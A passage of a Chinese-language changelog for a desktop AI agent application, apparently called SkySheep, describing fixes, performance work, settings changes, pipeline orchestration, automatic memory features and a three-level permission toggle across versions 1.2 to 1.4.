  所以看起来是一档一档地跳。现在改为就地复用已有圆点、只在数量变化时增删，
  宽度从旧值平滑变到新值。

- **「历史实测校准」从未生效（任务耗时预估）**。1.2 起预估区间会用本项目最近
  30 次实测耗时做校准，但实现是按相邻 user/assistant 消息的 `created_at` 差值
  反推轮耗时——而一轮的消息是**轮末批量落库**的，两条时间戳只差几毫秒，
  全被 `1 <= dur` 的噪音过滤滤掉，实际一次样本都取不到，预估一直停在纯启发式。
  现在实测耗时随消息落库，校准真正读得到数据；旧库消息没有该字段时仍按
  时间差兜底（诚实反映拿不到样本，不编造）。
- **「用时」当场看与刷新后对不上**。芯片此前由前端从收到预估事件那一刻起
  本地计时，与引擎的墙钟起点差一个网络往返；现在 `TurnFinished` 事件带上
  引擎实测值，前端据此定格，与落库后历史恢复显示的数字一致。
- **圆桌轮没有用时记录**。圆桌不走 `Agent.run_turn`（成员并行 → 主席融合，
  没有主循环），它的回答也就没人盖耗时，刷新后看不到用时；现在落库前统一
  补上本轮墙钟。
- **长回答流式输出越吐越卡（O(n²) 渲染）**：主回答 / 思考过程 / 辅助对话 /
  子代理直播四条流式路径，此前每条 delta 都对全量累积文本重跑一遍 markdown
  渲染并整树替换 innerHTML，文本越长每条越贵；现在与圆桌成员流同款 80ms
  节流（流结束的全量渲染兜底），长回答不再掉帧。子代理直播报告同时改为
  增量追加（`textContent +=` 每条都重写整个字符串节点，同样 O(n²)）。
- **历史渲染完没有滚到底**：渲染历史后滚动的是 `overflow:hidden` 的外层
  容器而非真正的滚动容器 `.chat-log`，滚动从不生效；现在直接滚聊天流。
- **选中引用按钮的调试残留**：按钮 title 上的 5 处 `dbg:*` 调试赋值移除；
  「流式中的回复不可引用」的判断此前检查一个从未被赋过的 CSS 类，改为
  直接对比当前流式消息元素，判断真正生效。

### 性能

全面性能走查的第一批（引擎 / 服务层 / 前端各热点，全部带定位注释）：

- **Anthropic 对话历史进 prompt cache**：缓存断点此前只打在 system 上
  （只覆盖工具定义与系统提示词），长会话的对话主体每次迭代都按全价 input
  计费；现在最后一条消息上再打一个断点，上一轮请求的前缀全部命中缓存
  （缓存读价约为全价的 1/10），长会话成本与延迟同步下降。
- **SQLite 换 WAL**：一轮对话至少 5 次独立 commit（每次 journal+fsync，
  Windows 杀软实时扫描下单次可达几十毫秒），读还会被写事务的排他锁挡住；
  `journal_mode=WAL + synchronous=NORMAL + busy_timeout=5000` 一次到位。
  顺带三件存储层的事：全文索引（FTS）写入挪进与消息同一条事务（旧写法在
  commit 之后，会话收尾的尾条索引可能静默丢失），启动改为按 rowid 增量
  补漏（历史遗留的索引漂移自动修复，已同步时零成本）；usage_log 补 ts
  索引（开预算护栏后每条消息发送前都要按时间求和，此前是全表扫描）。
- **大文件不再冻结界面**：文件面板的 fs.read 此前把整个文件读进内存再切
  前 400KB（点开几百 MB 的日志全 UI 假死），改为只读需要的前缀；grep 工具
  此前 `rglob("*")` 一次性物化整棵目录树再逐个过滤，改为 os.walk 剪枝
  （.git / node_modules 等跳过的目录根本不进遍历）并把整个扫描移入工作
  线程，大项目根上搜索不再停摆事件循环。
- **MCP 两处**：单次工具调用加 120 秒超时（SDK 默认无限等，一个挂死的
  服务器会把整轮对话停在原地）；多服务器改为并发连接（此前串行，每台
  配置错误的服务器独占最长 23 秒，装三台坏两台要白等一分钟）。
- **上下文压缩时机**：压缩检查此前只在轮次开头做一次，单轮内工具结果
  可以膨胀数十 k token，半路撞上窗口上限就是上游 400、前面迭代全部白跑；
  现在每次模型调用前复查（压缩帮不上忙时置位不重试）。压缩请求本身也把
  进入提示词的单条消息保头去尾截断——触发压缩时历史已经逼近上限，超长
  工具结果原样再发一遍会让压缩调用自己先吃 400。
- **check_task 防重复注入**：后台子代理的完整报告投递过一次后再轮询只
  回显开头 200 字，模型「稍后再查」的惯性不再把同一份长报告反复灌进
  主上下文（白花钱还挤占窗口）。
- **read_image 放线程**：PIL 解码 / 缩放 / optimize 编码与大文件 base64
  移入工作线程（与 screenshot 同款），读大图不再卡事件循环。
- **前端细节**：消息导航 minimap 切标签时解绑旧流的 scroll 监听（此前
  只增不减，是全文件唯一的监听器泄漏）；不再观察 characterData（流式期间
  被逐字变更轰炸，160ms 防抖形同虚设；流式渲染走 innerHTML 替换本就命中
  childList，高度变化另有 ResizeObserver 兜底）；重建时容器 rect 只读一次、
  圆点 title 摘要在消息定稿后缓存（此前每轮重建对每条消息做全文字符串
  扫描）；会话内查找输入加 200ms 防抖（每次击键都是拆 mark + 全消息
  TreeWalker 扫描 + 逐命中 DOM 替换）；工具卡收尾从全聊天流属性选择器
  扫描改为在途表 O(1) 直取（一轮几十上百个工具调用时是 O(n²)）。

### 性能（第二批）

- **会话运行时池加 LRU 淘汰**：点开过的每个会话（含定时任务 / 流水线产物、
  渠道会话）此前都常驻一整套 Agent + 工具注册表（含 MCP 工具实例）+ 全量
  历史，只增不减，桌面应用一开数天内存单调上涨——「用一天后变卡」的主因。
  现在运行时池上限 12 个，访问即移到队尾，超出从最旧开始回收**空闲**的
  （非当前会话、没在跑的轮、没排队消息、没待确认权限、没未落检查点的改动
  记录——宁可超限也不丢运行状态）；历史都在 SQLite，下次打开带着历史重建。
- **boot / 切会话不再整包下发历史原图**：历史消息里的图片此前连 base64
  本体一起下发，截图多的会话一次刷新几十 MB；现在只下占位（媒体类型 +
  定位信息），前端滚动到图片可见附近（提前 300px）才用新方法
  `session.image` 按需拉取（带项目归属校验），取回前显示灰底占位。
- **终端输出合并广播**：PTY 输出此前每 4KB 分片就对每个连接创建任务广播
  一条帧，`npm install` / 构建这类高频输出每秒几百片，CPU 与 WS 帧数被打爆
  还挤占对话流式事件；现在 40ms 合并窗口攒一条发（攒超 256KB 立即发），
  肉眼无感延迟。
- **启动备份改造**：滚动备份从「连接前同步整库拷贝」改为连接建立、
  WAL checkpoint 收尾后放线程拷贝（拷到的数据更完整，也不再卡事件循环）；
  并加「每日一份」频率限制——桌面应用一天可能启动多次，此前每次启动都
  全量压一份，库大了以后启动变慢；「从备份恢复」的整库拷贝同样放线程。
- **token 估算加指纹缓存**：上下文占用的全量估算此前每次调用都把整段历史
  join 成大字符串再逐字符正则，压缩复查与界面明细在长会话每轮要白算好几遍；
  现在按（历史列表, 长度, 末条）指纹缓存，历史未变时 O(1) 直取。
- **工具 schema 注册时缓存**：每次模型调用都把全部工具的 JSON schema 重新
  生成一遍（pydantic 的 model_json_schema() 不缓存），而注册表运行期静态，
  现在注册时构建、注册/覆盖时失效。
- **mermaid / xterm 懒加载**：mermaid 单文件 3.3MB、xterm 双文件约 400KB
  此前页面一打开就同步解析，冷启动白屏几百毫秒到秒级，而绝大多数会话一张
  图不画、底部终端默认关着；现在首次渲染图表 / 首次开终端时才注入脚本，
  加载失败按纯文本 / 提示兜底。
- **ignore 规则按 mtime 缓存**：glob/grep/@ 索引/文件树每次调用都重新读盘
  编译 .skysheepignore/.gitignore，现在按（目录, 文件 mtime）缓存，文件
  变了自动失效。
- **SDK 内置重试降为 1 次**：模型 SDK 各自叠 2 次重试 × 上层（agent/圆桌）
  的 3 次重试编排，持续性限流的最坏等待成倍放大还看不到进度；SDK 降为 1 次
  后由上层统一编排（带退避、通知与「已吐内容不重放」的正确判断）。
- **run_command 前台输出限量收集**：此前 capture_output=True 无上限，
  一条刷屏命令（递归 dir、卡住的构建日志）在超时窗口内能吃掉数百 MB 内存；
  现在只收头 4MB + 尾 64KB（中间带省略标记），超限继续排空管道不再积累，
  超时改为进程树终止（cmd /c 的子进程一并结束）。
- **检查点内容用后释放**：点一次「对比/撤销」就把该轮全部改前字节（含图片
  等大二进制）常驻到被 50 条上限挤出为止；现在磁盘模式下内容随返回结构走，
  store 本体用后即释放、再次使用懒加载。

### 变更

- **「本项目白名单」并入「高级」页**：此前它在设置侧栏单独占一页（安全分组），
  但绝大多数用户从不打开——权限确认弹窗的「总是允许（本项目）」已覆盖日常放行，
  规则只在需要撤销时才有人来，单独一页反而多占一层导航。现在整张卡片移进
  高级页（安全与后台上方），能力一项未减：查看/删除规则、手动添加、导入导出、
  清空、规则测试器全保留；测试器折叠为一行链接，不占版面；长说明压到两行，
  只留「前缀规不命中 shell 拼接 / 键盘鼠标只固化那次」这两条与规则行互补的信息。
  左侧导航删掉该项（安全组只剩高级）。
- **分组视图不再把当前项目置顶**：此前每次渲染都把「对话页正显示哪个项目的会话」
  的组排到列表最前，点开另一个项目的会话，整列项目的顺序就洗一次牌，找固定位置的
  项目反而变难。现在组序固定保持项目列表原序，当前项目改为「变化时自动展开它的
  组」来指示——只在切到新项目那一刻展开一次，手动折叠的组不会被反复顶开。

## [1.4] - 2026-09-21

### 变更

- **「快捷指令」更名「提示词」，触发符号 `/` 改为 `~`**：设置页卡片、弹窗、帮助与
  全部界面文案统一改称「提示词」；输入框输入 `~` 唤起提示词菜单（选中即插入模板），
  `/` 专职系统命令（/help /new 等），两者不再混在一个候选列表里。底层协议方法名
  （`snippets.*`）与存储表名保持不变，已有数据无缝沿用。
- **内置示例提示词落成真实记录**：设置 · 提示词不再显示「还没有自定义指令」的
  空提示——首次启动会把 5 条内置示例（总结项目 / 总结 PDF / Excel 转图表 / 调研话题 /
  修报错）直接写进指令库，与自建提示词一样可编辑、可删除；`~` 菜单里它们也从「内置
  示例」变成正式提示词。播种只做一次（哨兵标记放在 SkySheep home，与指令库同生命
  周期）：升级前已有自定义指令的老用户不受影响（保持「加了自定义后示例不再出现」
  的旧约定），种过之后删光也不复活，删光时 `~` 菜单仍以内置示例兜底。带测试
  （首启播种 / 删光不复活 / 老用户跳过 / 可编辑）。
- **记忆设置重排**：设置 · 全局记忆里「归档自动记忆」与「定期整理」两张卡合并为一张
  「自动记忆与整理」；「定期整理项目记忆（AGENTS.md）」开关从设置页移到右侧面板
  「项目记忆」页签最上方（切换即保存，全局开关与整理周期仍归设置页管）。
- **输入区「发送」按钮固定在右侧**：右侧簇（连接状态/思考强度/模型选择器/发送）
  整体不拆行，窄屏时整簇换行并靠右，发送不再单独折到左下角；工具条只剩一个
  「⤵ 导入」入口（JSON 文件恢复作为第四种来源并入导入弹窗）。
- **会话库备份列表默认收起**：只列「当前数据 + 最近几份」，其余由末尾按钮展开/收起，
  卡片不再被 20 行撑满。

### 新增

- **分组视图「折叠全部项目」按钮**：侧栏会话区标题行（视图切换旁）新增一键收拢
  所有项目组的按钮，项目一多时不用逐个点折叠；全收后按钮变「展开全部项目」，
  再点一次全部展开，箭头随之翻转。开合记忆与单组折叠同源（刷新不丢）；经典视图、
  搜索结果（平铺无组）下自动隐藏。修复过程中顺带统一了分组状态的键类型（项目 id
  数字与 dataset 字符串此前会各存一份）。
- **权限按钮三档切换**：输入框工具条的权限按钮（原「自动允许写入」开关）改为在
  三个模式间循环——「安全执行」（写入/执行都征询，盾牌图标）→「自动编辑」（工作
  目录内写入放行、命令仍征询，铅笔图标、金色）→「完全访问」（写入与命令执行都不
  再征询，开锁图标、警示红）→ 回到安全执行；档位存 ui.json 的 accept_edits
  （0/1/2），重启后保持。放宽档仍只允许本机界面切换（远端调用与设置导入照旧拦截），
  工具层安全防护（SSRF、路径拦截面）不受档位影响。带测试（门控单元 + WS 通路 +
  重启恢复 + 远端拦截）。
- **任务编排稳定性与传递性补强**（九项，均带测试）：
  - **any 依赖不再被单个失败误杀**：`dep_mode: any` 的下游此前只要有一个上游失败就立即
    标「依赖失败」，即使其他上游还在跑；现在等到全部依赖终态且无一完成才定死，
    任一完成即照常放行（门 FAIL 仍是硬约束）；
  - **节点超时**：每个节点可配超时（默认 1 小时，0 = 不限，上限一天，旧库自动补列
    `timeout_s`），超时按可重试失败处理——单节点卡死不再永久占用并发槽拖垮整条流水线；
  - **会话续跑遇忙退避**：目标会话正被使用时不再计为失败重试（此前 5 秒一次撞完
    重试配额就标死），改为退避重排队（5 分钟一档，不消耗尝试次数，空闲后自动续跑），
    并发额度也不被占用；
  - **自动重试带上失败原因**：第 N 次尝试的指令末尾附「上次失败原因」，Agent 换思路
    而不是原样再挂；
  - **产出全文落盘传递**：节点完成时把产出全文写进项目目录
    `.skysheep/pipeline-results/node-<id>.md`，下游指令里附路径——摘要注入仍是
    2000 字，需要全量时用只读工具自取；
  - **条件门无标记可辨识**：门节点忘了输出 PASS/FAIL 时，下游跳过原因明确写
    「没有输出 PASS/FAIL 标记（保守拦截）」，不再与真 FAIL 混为一谈；完成通知
    附带被跳过节点计数；
  - **已完成节点级联重跑**：重跑 done 节点时后端先返回下游清单供前端确认
    （`needs_confirm`），确认后全部传递下游一并退回重跑，避免下游继续用旧产出；
    顺带修复 done 状态的流水线重跑后不参与调度的问题；
  - **复制 / 导出 / 导入**：流水线可一键复制为草稿（结构与预授权保持、状态清零）、
    导出 JSON 文件、从 JSON 导入重建（`pipeline.duplicate/export/import`，变更类
    仅限本机）；
  - **token 用量可见**：流水线详情汇总各节点会话的输入/输出 tokens（复用
    `usage_log`），无人值守批量跑的成本一眼可见；收尾摘要还会推送到已配置
    允许名单的聊天渠道（Telegram 等，纯推送、名单为空不发）。新建弹窗的
    节点行同步增加超时输入，`max_runs` 一列三义（重试次数/迭代上限/门固定 1）
    在工具说明中写明。

### 新增

- **任务编排支持控制流**：节点不再只会「依赖满足就跑」，新增三种控制节点与失败重试——
  - **条件门（gate）**：节点指令描述一个检查，Agent 在产出首行输出 PASS / FAIL；
    FAIL 时依赖它的下游整体标记「已跳过」（级联，不算失败，流水线正常收尾）；
  - **终止（stop）**：纯控制节点（不派 Agent），依赖满足即在此截停整条流水线，
    未开始的节点全部取消；适合「检查不通过就到此为止」；
  - **迭代（loop）**：反复执行同一节点（上限 2~10 轮），每轮自动带上上一轮产出继续；
    Agent 在产出首行写 DONE 表示完成，DONE 行从最终产出里剥掉；达到上限未见 DONE
    也正常完成并备注；
  - **失败重试**：普通节点可设「失败自动重试 N 次」（上限 3），失败后自动重新排队。
  依赖图同步区分控制节点（条件门琥珀虚线 ◇、终止红框 ⏹、迭代蓝点线 ↻ 并显示轮次
  进度），新建弹窗的节点行加类型选择与对应参数。旧库自动补列（control / max_runs），
  已有流水线行为完全不变。
- **任务编排的依赖图可视化**。流水线的节点关系从一排平铺小片升级为流程图：
  右面板列表的每条流水线直接画出「谁依赖谁」的分层图（节点框按状态着色，
  SVG 贝塞尔连线带箭头，汇合/分支一目了然）；详情弹窗顶部是同一张完整依赖图，
  点图上节点会滚动到对应详情卡并高亮。纯 HTML/SVG 自绘（不引入 mermaid），
  布局随面板宽度自适应，六套主题跟随变量配色。
- **子代理的模型下拉只列出配了 Key 的服务**（内置子代理与自定义子代理两处共用），
  「（未配 Key）」的一长串不再霸占下拉；当前已选中的服务即使未配 Key 也会保留并标注，
  避免历史配置被静默丢掉。顺带调整了所有下拉展开后的选项样式：厂商分组小字灰显、
  选项行距收紧、「跟随主对话」等空值选项弱化为斜体灰字。子代理的「自定义勾选」工具
  网格同步修正为等宽两列、勾选框与工具名同行对齐（此前被表单样式的纵排规则压成
  「框在上、名字在下」的错位）。
- **弹窗填空框统一样式**：定时任务 / 流水线 / 快捷指令 / 日程一族弹窗里的输入框与下拉框
  统一为同高（36px）、同内边距，提示词与选中值从同一条线起笔——原生下拉的文字
  缩进会随部件状态漂移（与输入框永远差几像素），现改为自绘箭头的统一外观，
  禁用态自动减淡。日程弹窗的「到点在应用内提醒」勾选框同步统一为主题色，
  命中面积与其他开关一致。
- **工作项目弹窗「切换到其他文件夹」补齐主题皮**：路径输入框此前是 WebView 默认
  白底黑框（没吃到任何主题样式），现改为与应用一致的「纸面 + 硬墨描边」等宽
  输入框，焦点态与六套主题换色自动跟随；「选择」按钮的 📁 emoji 换成侧栏项目
  列表同款的描边文件夹图标（随主题色），标签加粗、与输入框间距对齐其他弹窗表单。
- **任务编排纳入现有任务**：流水线节点不再只能「新起一份无人值守运行」，三类现有任务
  都能进依赖图——① 任务簿后台任务挂接（`pipeline.attach` / `pipeline_write` 的
  `add_node` 给 `task_id`）：节点状态与产出跟随原任务（`task_finished` 事件即时对账），
  正在跑的挂进来，下游就能「等它完成」，挂接节点不占流水线并发额度、不能单独重跑；
  ② 已有会话续跑（`pipeline.add_session`）：节点在原会话的历史上下文里继续执行（续跑
  指令与上游产出注入该轮），仍按节点预授权名单无人值守运行，会话正被使用时拒绝执行
  等空闲后重跑；③ 定时任务导入（`pipeline.import_cron`）：把指令与预授权名单复制成
  run 节点，可一并停用原任务。右面板「任务编排」新增「⤵ 导入」弹窗（选来源 → 选对象 →
  选目标流水线或新建 → 勾依赖），定时任务行与任务簿行各有 ⛓ 快捷入口；已结束的流水线
  也能再纳入节点做延展，启动按钮随之恢复。`pipeline_nodes` 新增 `kind` / `ref_id` 列
  （旧库连接时自动补列）。
- **经典视图两区各自定高、内部滚动**。此前侧栏整条滚动，项目一多就把会话区顶出视口；
  现在项目列表封顶约 6 行（超出内部滚动），会话区吃满侧栏剩余高度、会话列表内部滚动，
  搜索框与范围切换固定不随列表滚走；分组视图隐藏项目区后会话列表同样吃满剩余。
  极端矮窗口（内容保底高度也放不下）仍回退整条滚动兜底。

- **侧栏「分组视图」：会话收进各自项目下**。项目一多时，经典的「项目 / 会话」两区布局会把
  会话区挤得很短；新增的第二种呈现形式把项目变成会话列表里的可折叠文件夹头，会话缩进挂在
  其下（每项目默认露出 5 条，其余收进「显示更多」，可展开/收起），列表末尾保留「添加项目」
  入口，快聊等不属于任何项目的会话收进结尾兜底组。点项目头只展开/折叠该项目下的会话（不切
  换项目）；点其他项目下的某条会话会先切到该项目再打开（与「全部项目」搜索命中同一流程）。
  该视图下「本项目/全部项目」搜索范围切换随之隐藏，搜索固定按全部项目执行（结果保留项目名
  标签），切回经典视图时恢复之前选的范围。两种形式并存，用「会话」标题右侧的图标切换，
  选择存 `ui.json` 的
  `sidebar_view`（classic=原两区样式，保留为默认）。实现：`session.list` 新增 `all_projects`
  参数（窗口函数按项目各取前 50 条未归档会话；跨项目标题/摘要与 `session.search scope=all`
  同一安全口径，仅限本机桌面端，远程调用会被拒绝并自动退回经典视图）。

## [1.3] - 2026-09-20

### 新增

- **任务编排（流水线）**：解决「多个任务并行跑、完成先后不一致，最后要一个审查/汇总
  等全部完成」的顺序问题。一条流水线含多个节点，节点之间是依赖关系（`depends_on`
  + `dep_mode: all/any`）：前置节点并行执行、依赖全部完成后下游自动开始，汇总/审查
  节点的 prompt 自动注入各上游产出的摘要（单条截断 2000 字）。每个节点是一次无人值守
  Agent 运行，与定时任务同一套执行底座（独立会话 + HeadlessGate 白名单 + 完整工具集）：
  只放行只读工具与节点预授权名单，其余写入/执行自动拒绝；并发按流水线上限（1~4）+
  全局上限调度，依赖失败的下游标「依赖失败」挂起而不照跑，失败节点可单独重跑（因它
  失败的下游一并放行）；应用重启时运行中的节点标为错误等用户手动重跑；一条流水线
  最多 50 个节点（单条指令上限 1 万字），跨项目的节点系统提示词按节点所属项目的
  工作目录与 AGENTS.md 组装（与定时任务共用此修复）。入口两条：
  右面板新增「任务编排」标签（新建向导按节点填指令/依赖/预授权，启动/停止/重跑，
  节点状态胶囊随 `pipeline_updated` 事件实时刷新）+ `pipeline_write` 会话工具（Agent
  对话里即可排流水线，但只能建草稿——启动必须在面板由用户亲手点，无人值守预授权
  始终由人把关）。新增 `pipelines` / `pipeline_nodes` 两张表与 `pipeline.list/get/
  create/start/cancel/delete/node_rerun` 七个 WS 方法（变更类仅限本机），流水线完成/
  失败以通知横幅告知。

- **归档自动记忆**：会话归档（且此前未归档）后，后台用当前模型通读本次对话，
  按 `memory_write` 的同一套判定标准（用户偏好、常用环境、背景约定，不记
  一次性任务细节与机密）提炼至多 8 条值得跨项目长期记住的事实，按既有记忆
  去重后自动追加进用户记忆 `~/.skysheep/memory.md`（带日期前缀与「(自动)」
  来源标记，单条 ≤100 字，全局记忆页可一眼分辨清理），
  并像项目记忆保存一样全局刷新系统提示词，所有会话下一轮即带上新记忆；提炼
  完成以 🧠 通知告知记住了什么（`memory_digest` 事件），无新增不打扰，失败
  静默只记日志、绝不影响归档本身。寒暄/单条短问答（用户+助手正文合计不足
  300 字）不触发；演示模式不消耗脚本组；同一会话只提炼一次（重复归档、
  取消归档后再归档都不会重复花模型调用，提炼失败除外）。
  提炼的提示词组装、解析与落盘纯函数（`digest_transcript` / `build_digest_prompt`
  / `parse_digest` / `remember_lines`）收敛在 `tools/memory.py`，与手动记忆
  共用去重与容量护栏（200KB 滚动丢弃最旧）。设置 · 全局记忆页新增「归档自动
  记忆」总闸（`memory_digest` 配置项，默认开）：切换即写 config.toml 热生效
  （`memory.digest_save`），关闭后归档不再触发提炼。

- **定期自动整理记忆**：后台巡检循环（每 10 分钟一跳）按 `[memory_maintenance]`
  配置的周期，用当前模型通读全局记忆（`~/.skysheep/memory.md`）与当前项目的
  项目记忆（AGENTS.md），合并重复与相近条目、清理过时内容、精简表述——记忆
  越用越精炼而不是越攒越长。全局与项目各有开关、共用周期（默认每周，可调
  每天/每 3 天/每周/每 30 天），整理前自动把原件备份为同目录 `.bak` 文件，
  完成后以 🧹 通知告知（`memory_maintain` 事件）；模型输出为空、与原文一致或
  超长失控时一律不动原文件，失败静默只记日志。文件太短不值得整理时自动跳过
  （全局 <400 字、项目 <600 字），「上次整理时间」按记忆各自记录在
  `~/.skysheep/memory-maintenance.json`。设置 · 全局记忆新增「定期整理」卡片：
  两个开关 + 周期下拉（`memory.maintain_save`，保存即热生效）+ 🧹「立即整理」
  按钮（`memory.maintain_now`，无视周期与开关手动跑一轮，仍守最短规模阈值）
  与上次整理时间展示；整理完成后系统提示词即时刷新，所有会话下一轮生效。

- **圆桌省 token 三件套**：① 成员轻上下文——新增 `[roundtable]`
  `member_history_turns`（默认 0 = 全量），设为 N 后成员只看最近 N 轮历史，
  主席融合始终吃全量历史，砍掉「N 个成员 × 全量历史」的输入放大（长会话
  圆桌最大的 token 开销）；设置 · 圆桌 可调。② 融合输入近重去重——成员草稿
  与另一份高度相似（相似度 ≥0.9，只对 600 字以上的长草稿生效，短文本相似
  语义可能相反）时，提示词里替换为「与成员X基本一致」占位，辩论收敛后
  雷同草稿不再逐字重复占用主席/成员上下文；融合与辩论提示词都生效，
  纯 difflib 标准库、零额外请求。③ 成员身份预设——输入框圆桌面板勾选成员
  后可给每个成员指定身份：批评者 / 事实核查员 / 简洁派 / 实干者（普通 =
  无附加身份），不同视角的作答提示词拼进成员系统提示词、贯穿独立作答与
  辩论各轮，让多样性不只来自模型差异；身份随圆桌元数据持久化，成员卡
  显示身份徽标，重新生成沿用原身份。

### 修复

- **快捷指令弹窗打不开**：新建/编辑弹窗的模板串里误写了一个模板插值（占位提示里
  的 `${clipboard}` 引用了不存在的变量），点「＋ 新建」或「✎ 编辑」会在开窗瞬间抛
  ReferenceError、弹窗闪不出；改为按本意显示 `{{clipboard}}` 字面量提示。
- **圆桌健壮性四处修订**：① 成员阶段点停止不再丢失内容——进行中成员已流出
  的部分草稿在引擎层回收（状态 error、标注「已取消」），已完成的成员草稿随
  轮次按对比式落库，刷新/重进会话后照常回看（此前成员卡只活在当前页面，
  刷新即逝）；② 融合草稿总量预算——此前只限单份草稿 12000 字符，8 个成员
  齐上时融合提示词仍可能撑爆主席上下文，现按主席剩余上下文等比压缩全部
  草稿（每个成员的观点开头都保留），辩论轮另有 48000 字符总兜底；③ 同一
  模型服务的成员共享并发闸（每服务至多 2 路并发），多模型一把 Key 时从源头
  防限流——流式吐到一半被 429 是不可重试的；④ 辩论轮不再反复重试没希望的
  成员：构建失败（缺 Key）从第一个辩论轮起零成本跳过，运行期失败的成员给
  一次带彼此草稿的重试机会，连败两轮后跳过（此前每轮辩论都会把缺 Key 成员
  原样再败一遍）。新增 5 项测试覆盖取消回收、总预算截断、并发闸与跳过规则。

## [1.2] - 2026-09-19

### 新增

- **任务耗时预估**：Agent 接手一个任务（发消息开跑）时，引擎先按任务复杂度
  给出预计完成区间，随 `task_estimate` 事件先于本轮任何输出下发。聊天流里
  回复上方出现一枚预估条「⏱ 预计 3~8 分钟 · 已 1 分 12 秒」，运行中每秒对照
  已用时，超出预估区间会变成金色虚线的「超出预估」弱提示；本轮结束时定格为
  一条弱化的用时记录「用时 4 分 32 秒 · 预估 3~8 分钟」，排队轮各自带各的
  预估条。预估是纯启发式、零额外请求（与思考强度「自动」档同一套思路，
  `core/estimate.py`）：综合任务文本的复杂度信号（寒暄 / 轻量问答 / 排查重构
  / 代码 / 编号步骤 / 「完整·全部」类范围放大词）与近期历史（多步工具作业
  进行中、工具在报错），再用本项目最近 30 次「用户消息→助手回复」的实测
  耗时中位数校准区间边界（样本 ≥3 次才参与，实测比直觉快或慢都会把边界
  拉过去），悬停预估条可看依据说明。圆桌轮按成员数与辩论轮数温和放大；
  重新生成轮不算接手新任务，不发预估；终端 REPL 同步打印一行弱化的
  「⏱ 预计耗时 X~Y 分钟（依据）」。

- **引用回答片段**：在聊天流里用鼠标选中一条回答中的任意内容（含工具卡片里的文字），
  选区旁会浮出「❝ 引用到输入框」按钮，点击把选中内容以 markdown 引用块（`> ` 前缀）
  追加进输入框，接着输入问题发送即可针对片段追问；超长选区自动截断到 1200 字。
  消息发出后，用户气泡里行首的引用块会渲染成带竖线的样式化引用段（区别于正文），
  会话历史与重载后显示一致。配套两处渲染增强：助手回答里连续多行的 `>` 引用在
  Markdown 渲染时合并为单个引用块（此前逐行各包一个会碎成多段）；用户气泡对
  行首引用块做同样处理。**附带修复了一个更底层的问题**：pywebview 创建窗口默认
  `text_select=False`，会向页面注入 `body { user-select: none }`——桌面窗口里所有
  文字（包括聊天内容）此前根本无法拖选，这正是「选中片段引用」在桌面版失灵的根因。
  现在窗口创建显式传 `text_select=True`，并在聊天流上显式解禁（`user-select: text`）
  双保险，聊天内容可正常拖选，其余界面元素保持不可选。

- **上下文容量仪表：挪到语音输入旁 + 悬停展开构成明细**。环形仪表从模型选择器
  旁挪到语音输入按钮右侧；鼠标悬停 / 点按弹出明细面板——顶部为总量与占比
  （如 `1,673/8万（2.1%）`）和进度条（≥70% 金 / ≥90% 红，与环同步），下方按占用
  降序列出**消息 / 系统工具 / 技能 / 系统提示词 / MCP 工具 / 其他**的分桶估算
  （彩点标识；「其他」吸收图片输入与各家 tokenizer 的估算偏差），底部是本次会话
  累计的**平均缓存命中率**：OpenAI 系读 `prompt_tokens_details.cached_tokens`、
  DeepSeek 系读 `prompt_cache_hit_tokens`、Anthropic 读
  `cache_read / cache_creation_input_tokens`（命中只计读），服务未上报时显示
  「—」而不冒充 0%。明细随 `chat.send` / `chat.status` / `chat.compact` 响应以
  `context_detail` 字段下发、随标签存取；触屏无悬停时点按同样可开合，
  弹层定位对页面缩放环境做了自校正。

### 变更

- **内置模型服务预设重构为 10 家厂商，列表头像改用官方 logo**：「默认」页签按
  Anthropic、OpenAI、Google、xAI、MiniMax、Deepseek、智谱、Kimi、Qwen、
  小米 Mimo 排列（末尾保留 Ollama 本地入口），各家带显示名（`label` 字段：
  界面显示「智谱 / Kimi / 小米 Mimo」，配置键保持 ASCII 稳定，老配置升级无感）。
  预设新增 openai / google / xai / minimax / qwen / mimo 六家端点与默认模型；
  openrouter / siliconflow 移出预设——老用户配置过的条目原样保留（Key 不丢），
  只是挪到「自定义」页签；画图的硅基流动 Key 复用改为只认环境变量，不再要求
  模型服务里配着该服务。列表与顶栏模型菜单的头像改用 `static/logos/` 下的
  厂商 logo（Simple Icons 单色 SVG 滤白衬品牌色底，智谱用站点图标白底显示；
  xAI 暂无可用图标，回落字母头像），自定义服务仍是彩色字母头像。

- **设置页全面走查（内容 / 样式 / 分配）**，十二个子页逐项核对后的集中修订：
  - 模型服务的「删除内置服务」统一改称**停用**（详情页按钮、确认弹窗、列表区块
    「已停用的服务」全套对齐；停用列表同时涵盖内置与自定义服务，自定义恢复时
    配置原样保留）；详情页里功能重复的「⚡ 检测连接」按钮并入「检测并获取模型」。
  - 「内置工具」的 20+ 行工具清单默认收起为折叠块（与技能广场同一套交互），
    标题带工具总数；「启用系统通知 / 显示云朵小羊」开关行改为左对齐，
    不再把文字拉到卡片最右端。
  - 用量页新增**每日预算进度行**（「今日已用 X tokens · 预算 Y」，达上限标黄并说明
    暂停原因），与高级 · 运行参数里的「每日 token 预算」联动；`usage.stats` 相应
    新增 `budget` / `today` 字段。「Token 活动」无记录时不再撑出 220px 空盒。
  - 文案补全：设置导出 / 导入写明含**自定义子代理与技能启用范围**；全局记忆页
    指明「项目记忆」在右侧面板编辑；快捷指令说明内置示例在添加第一条后隐藏；
    白名单页交叉引用高级 · 安全与后台的目录限制；钩子页补一个前钩子拦截示例；
    关于页交代启动时也会自动检查更新。
  - 样式收敛：圆桌设置的行内宽度改用 `.num-sm` / `.sel-md` 类；「已启用模型」的
    删除钮紧跟模型名，不再顶到面板最右侧。

- **设置 · 模型服务列表按「默认 / 自定义」页签分类**：列表顶部加分段控件
  （与侧栏「本项目 / 全部项目」、顶栏模型菜单同款样式），内置预设归「默认」、
  用户新增的归「自定义」，点页签切换；行内原来的「自定义」小徽标随之取消，
  页签已经说明归属。某一组为空时给出各自的引导提示（默认组指向「已停用的
  服务」恢复入口，自定义组指向右上角添加按钮）；添加自定义服务后自动切到
  「自定义」页签，恢复服务后若不在当前页签的分组里也会自动切过去。

- **思考强度「自动」档改为按任务复杂度实时调整**：此前「自动」只是不干预
  （不向服务发送任何思考参数，沿用服务默认行为）；现在引擎在每次调用模型前
  根据当前上下文估一个档位，随任务推进逐轮升降——寒暄、翻译、格式整理走低档
  （更快更省），多步工具作业维持中档，出现调试排错、方案设计等信号或工具连续
  报错时自动升到高档。估档纯启发式、零额外请求；只对声明支持思考强度的服务
  实际下发参数（OpenAI 兼容服务传 `reasoning_effort`，Anthropic 映射
  `thinking.budget_tokens`），手动选定的低/中/高档行为不变。新增
